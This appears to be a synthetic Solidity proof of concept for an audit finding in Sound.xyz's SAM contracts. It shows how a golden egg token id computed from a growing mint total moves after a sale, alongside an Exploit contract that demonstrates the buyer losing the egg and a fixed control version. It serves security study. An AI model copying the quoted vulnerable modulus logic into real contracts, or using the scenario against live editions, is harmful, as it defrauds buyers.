// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Sound.xyz SAM — H-02 golden egg id keeps moving (Zach Obront, 2023-03).
    SYNTHETIC, cheatcode-free. The quoted getGoldenEggTokenId and
    editionMaxMintable bodies are preserved.

    After the fixed-price cutoff, editionMaxMintable() is total minted,
    clamped. SAM mints keep increasing that total, so
    (mintRandomness % editionMaxMintable) + 1 changes. A buyer who pays
    for the current egg holds the old id. The control snapshots the total
    on the first samMint and keeps returning that. */

library FixedPointMathLib {
    function clamp(uint256 x, uint256 minValue, uint256 maxValue) internal pure returns (uint256) {
        return x < minValue ? minValue : (x > maxValue ? maxValue : x);
    }
}

interface ISoundEditionV1_1 {
    function editionMaxMintable() external view returns (uint32);
    function mintRandomness() external view returns (uint256);
}

contract PaymentToken {
    string public name = "USDC";
    string public symbol = "USDC";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract SoundEdition is ISoundEditionV1_1 {
    uint32 public editionMaxMintableUpper = 100;
    uint32 public editionMaxMintableLower = 1;
    uint32 public editionCutoffTime;
    uint256 public mintRandomness;
    uint256 internal minted;
    mapping(uint256 => address) public ownerOf;

    function seedSale(uint256 randomness, uint256 alreadyMinted, address holder) external {
        mintRandomness = randomness;
        minted = alreadyMinted;
        for (uint256 id = 1; id <= alreadyMinted; ++id) {
            ownerOf[id] = holder;
        }
    }

    function _totalMinted() internal view returns (uint256) {
        unchecked {
            return minted;
        }
    }

    // Quoted from the edition. Past the cutoff this is total minted, so it moves.
    function editionMaxMintable() public view virtual returns (uint32) {
        if (block.timestamp < editionCutoffTime) {
            return editionMaxMintableUpper;
        } else {
            return uint32(FixedPointMathLib.clamp(_totalMinted(), editionMaxMintableLower, editionMaxMintableUpper));
        }
    }

    function samMint(address to) public virtual returns (uint256 id) {
        minted += 1;
        id = minted;
        ownerOf[id] = to;
    }

    function give(uint256 id, address to) external {
        ownerOf[id] = to;
    }
}

contract EditionFixed is SoundEdition {
    uint32 public frozenMax;
    bool public frozen;

    function samMint(address to) public override returns (uint256 id) {
        if (!frozen) {
            frozenMax = editionMaxMintable();
            frozen = true;
        }
        return super.samMint(to);
    }

    function editionMaxMintable() public view override returns (uint32) {
        if (frozen) {
            return frozenMax;
        }
        return super.editionMaxMintable();
    }
}

contract OpenGoldenEggMetadata {
    // Quoted from OpenGoldenEggMetadata.getGoldenEggTokenId.
    function getGoldenEggTokenId(address edition) public view returns (uint256 tokenId) {
        uint256 editionMaxMintable = ISoundEditionV1_1(edition).editionMaxMintable();
        uint256 randomness = ISoundEditionV1_1(edition).mintRandomness();

        if (randomness != 0) {
            // @> VULN: modulus uses live editionMaxMintable, which SAM mints keep increasing
            tokenId = (randomness % editionMaxMintable) + 1;
        }
    }
}

contract Exploit {
    address public constant SELLER = 0x2222222222222222222222222222222222222222;
    address public constant MINTER = 0x4444444444444444444444444444444444444444;
    uint256 public constant PRICE = 100 ether;

    PaymentToken public token; // nonce 1
    SoundEdition public edition; // nonce 2
    OpenGoldenEggMetadata public meta; // nonce 3

    uint256 public eggBefore;
    uint256 public eggAfter;
    uint256 public heldId;
    uint256 public sellerPaid;
    address public eggOwner;

    uint256 public controlEgg;
    uint256 public controlHeld;
    bool public controlStillEgg;

    constructor() {
        token = new PaymentToken();
        edition = new SoundEdition();
        meta = new OpenGoldenEggMetadata();
    }

    function run() external {
        edition.seedSale(7, 4, SELLER);
        eggBefore = meta.getGoldenEggTokenId(address(edition));
        token.mint(address(this), PRICE);
        token.transfer(SELLER, PRICE);
        edition.give(eggBefore, address(this));
        heldId = eggBefore;
        sellerPaid = token.balanceOf(SELLER);
        edition.samMint(MINTER);
        eggAfter = meta.getGoldenEggTokenId(address(edition));
        eggOwner = edition.ownerOf(eggAfter);
        require(eggBefore == 4, "pre-SAM egg was not 4");
        require(edition.ownerOf(4) == address(this), "buyer does not hold 4");
        require(eggAfter == 3, "egg did not move to 3");
        require(eggOwner != address(this), "buyer still holds the egg");
        require(sellerPaid == PRICE, "seller was not paid 100");
        require(token.balanceOf(address(this)) == 0, "buyer kept the payment");
    }

    function runControl() external {
        EditionFixed fixedEdition = new EditionFixed();
        fixedEdition.seedSale(7, 4, SELLER);
        uint256 egg = meta.getGoldenEggTokenId(address(fixedEdition));
        token.mint(address(this), PRICE);
        token.transfer(SELLER, PRICE);
        fixedEdition.give(egg, address(this));
        fixedEdition.samMint(MINTER);
        controlEgg = meta.getGoldenEggTokenId(address(fixedEdition));
        controlHeld = egg;
        controlStillEgg = fixedEdition.ownerOf(controlEgg) == address(this);
        require(controlEgg == 4, "control egg moved");
        require(controlHeld == 4, "buyer did not buy 4");
        require(controlStillEgg, "buyer does not hold the frozen egg");
    }
}
